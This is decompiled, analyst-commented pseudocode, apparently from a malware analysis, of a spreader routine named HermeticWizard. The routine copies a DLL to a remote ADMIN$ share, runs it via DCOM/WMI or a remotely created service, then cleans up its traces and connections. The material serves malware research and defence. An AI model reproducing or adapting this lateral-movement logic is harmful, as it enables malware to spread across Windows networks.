
void __thiscall mw_main_proc(mw_ctx_t *arg_ctx)
{
  if ( !arg_ctx->dwValue )
  {
    // First, it creates a connection to the remote ADMIN$ share of the target using WNetAddConnection2W. 
    // The file provided in the -s argument is then copied using CopyFileW. 
    // The remote file has a random name generated with CoCreateGUID (e.g., cB9F06408D8D2.dll) and the string format c%02X%02X%02X%02X%02X%02X.
    v_dll_is_copied = mw_copy_file_to_remote_admin_share_path(arg_ctx);
    arg_ctx->dll_is_copied = v_dll_is_copied;
    if ( v_dll_is_copied )
    {
      // Second, it tries to execute the copied file, HermeticWizard, on the remote machine using DCOM
      v_dll_is_exec = mw_exec_copied_dll_using_COM_wrap(arg_ctx);
      arg_ctx->dwValue = v_dll_is_exec;
      if ( v_dll_is_exec )
      {
        Sleep(5000u);
      }
      else
      {
        // If the WMI technique fails, it tries to create a service using OpenRemoteServiceManager with the same command as above.
        v_scManagerHandle = mw_retrieve_service_control_handle(arg_ctx);
        if ( v_scManagerHandle )
        {
          arg_ctx->is_service = 1;
          if ( mw_create_service(v_scManagerHandle, arg_ctx) )
          {
            v_service_handle = OpenServiceW(v_scManagerHandle, arg_ctx->wstr_random_guid, SERVICE_ALL_ACCESS);
            if ( v_service_handle )
              v_is_service_running = mw_check_service_is_running_ifnot_start_service_wrap(v_service_handle);
            else
              v_is_service_running = 0;
            arg_ctx->dwValue = v_is_service_running;
            if ( v_is_service_running )
              Sleep(5000u);
            v_service_handle = OpenServiceW(v_scManagerHandle, arg_ctx->wstr_random_guid, SERVICE_ALL_ACCESS);
            if ( v_service_handle )
              mw_delete_service(v_service_handle);
          }
          CloseServiceHandle(v_scManagerHandle);
          if ( arg_ctx->is_connect_to_IPC_share )
          {
            vwstr_RemoteNetworkResource = arg_ctx->remote_network_resource;
            vwstr_remote_share[3] = 'P';
            vwstr_remote_share[4] = 'C';
            vwstr_remote_share[2] = 'I';
            vwstr_remote_share[5] = '$';
            vwstr_remote_share[6] = '\0';
            mw_cancel_network_connection(vwstr_RemoteNetworkResource, &vwstr_remote_share[2]);
          }
        }
      }
      if ( !arg_ctx->dwValue )
        mw_remove_admin_share_target(arg_ctx);
      if ( arg_ctx->is_connect_to_admin_share )
      {
        vwstr_RemoteNetworkResource = arg_ctx->remote_network_resource;
        vwstr_remote_share[0] = 'A';
        vwstr_remote_share[1] = 'D';
        vwstr_remote_share[2] = 'M';
        vwstr_remote_share[4] = 'N';
        vwstr_remote_share[3] = 'I';
        vwstr_remote_share[5] = '$';
        vwstr_remote_share[6] = '\0';
        mw_cancel_network_connection(vwstr_RemoteNetworkResource, vwstr_remote_share);
      }
    }
  }
}

